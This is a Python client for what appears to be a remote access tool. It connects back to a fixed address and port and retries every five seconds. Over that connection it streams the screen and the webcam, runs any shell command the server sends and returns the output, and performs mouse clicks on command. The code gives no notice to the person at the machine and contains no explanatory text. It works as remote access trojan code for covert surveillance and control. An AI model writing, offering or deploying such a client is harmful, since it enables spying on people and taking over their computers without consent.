from threading import Thread, Event
from PIL import ImageGrab
from queue import Queue, Empty

import subprocess
import pyautogui
import socket
import psutil
import numpy
import time
import cv2

CAMERA_STREAM = b'\x01'
CAMERA_ENABLE = b'\x02'
SCREEN_STREAM = b'\x03'
COMMAND_PACKET = b'\x04'
MOUSE_PACKET = b'\x05'
RMOUSEBUTTON = b'\x06'
LMOUSEBUTTON = b'\x07'

process = psutil.Process()

class Client:
    def __init__(self):
        self.stream_cam_enabled = False
        self.close_thread = False
        self.screen_thread = None
        self.cam_thread = None
        self.client = None

        self.mouse_click = None
        self.mouse_xy = (int, int)

        self.thread_queue = Queue()
        self.thread_event = Event()
        self.thread_event.set()

        self.connect_client()

    def connect_client(self):
        while True:
            print("Attempting to connect to server...")

            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.connect(("192.168.15.3", 4000))

                self.stream_cam_enabled = False
                self.close_thread = False
                self.mouse_click = None

                self.cam_thread = Thread(target=self.get_cam_stream, args=(), daemon=True)
                self.cam_thread.start()

                self.screen_thread = Thread(target=self.get_screen, args=(), daemon=True)
                self.screen_thread.start()

                self.mouse_thread = Thread(target=self.mouse_redirect, args=(), daemon=True)
                self.mouse_thread.start()

                self.send_thread = Thread(target=self.send_all, args=(), daemon=True)
                self.send_thread.start()

                self.clear_queue()

                self.process_operations()

            except Exception as err:
                print(f"Error occurred: {err}")

                self.client.close()

                time.sleep(5)
                continue
    
    def send_all(self):
        while True:
            packet = self.thread_queue.get()

            if packet:
                self.client.sendall(packet)
                self.thread_event.clear()
               

    def receive_all(self):
        try:
            data = self.client.recv(1024)
            return data
            
        except:
            self.close_thread = True
            return

    def clear_queue(self):
        while True:
            try:
                self.thread_queue.get_nowait()
            except Empty:
                self.thread_event.set()
                break

    def get_screen(self):
        while not self.close_thread:
            self.thread_event.wait()

            img = numpy.array(ImageGrab.grab())
            img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)

            _, encoded = cv2.imencode(".jpg", img, [cv2.IMWRITE_JPEG_QUALITY, 100])

            frame_dump = encoded.tobytes()
            dump_len = len(frame_dump)

            len_frame = [(dump_len >> 16) & 0xff, (dump_len >> 8) & 0xff, dump_len & 0xff]

            self.thread_queue.put_nowait(SCREEN_STREAM + bytes([*len_frame]) + frame_dump)
           
    def get_cam_stream(self):
        while not self.close_thread and self.stream_cam_enabled:
            try:
                cap = cv2.VideoCapture(0)

                while not self.close_thread:
                    self.thread_event.wait()

                    ret, frame = cap.read()

                    if not ret or frame is None:
                        time.sleep(0.05)
                        continue

                    _, encoded = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 100])

                    frame_dump = encoded.tobytes()
                    dump_len = len(frame_dump)

                    len_frame = [(dump_len >> 16) & 0xff, (dump_len >> 8) & 0xff, dump_len & 0xff]

                    self.thread_queue.put(CAMERA_STREAM + bytes([*len_frame]) + frame_dump)
                       
                cap.release()

            except Exception as err:
                print("No camera detected")
                time.sleep(10)

    def command_process(self, data):
        try:
            sys = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = sys.communicate()

            sys_output = output if output else error

            print(sys_output.decode("cp850"))

            if sys_output:
                self.clear_queue()
                self.thread_queue.put(COMMAND_PACKET + len(sys_output).to_bytes(3, "big") + sys_output)

        except Exception as err:
            print(err)
 

    def mouse_redirect(self):
        while not self.close_thread:
            if self.mouse_click is None:
                time.sleep(0.01)
                continue

            if self.mouse_click == RMOUSEBUTTON:
                pyautogui.rightClick(self.mouse_xy[0], self.mouse_xy[1])

            elif self.mouse_click == LMOUSEBUTTON:
                pyautogui.click(self.mouse_xy[0], self.mouse_xy[1])

            self.mouse_click = None

    def process_operations(self):
        while not self.close_thread:
            try:
                opcode = self.receive_all()

            except:
                continue

            if opcode[1:4] !=  b'\xff\xff\xff':
                if opcode[:1] == COMMAND_PACKET:
                    self.command_process(opcode[1:].decode())

                elif opcode[:1] == MOUSE_PACKET:
                    self.mouse_click = opcode[1:2]
                    self.mouse_xy = [int.from_bytes(opcode[2:4], "big"), int.from_bytes(opcode[4:6], "big")]

                elif opcode[:1] == CAMERA_ENABLE:
                    self.stream_cam_enabled = True

                elif opcode[:1] == SCREEN_STREAM:
                    self.thread_event.set()
                    
            else: 
                self.clear_queue()

if __name__ == "__main__":
    Client()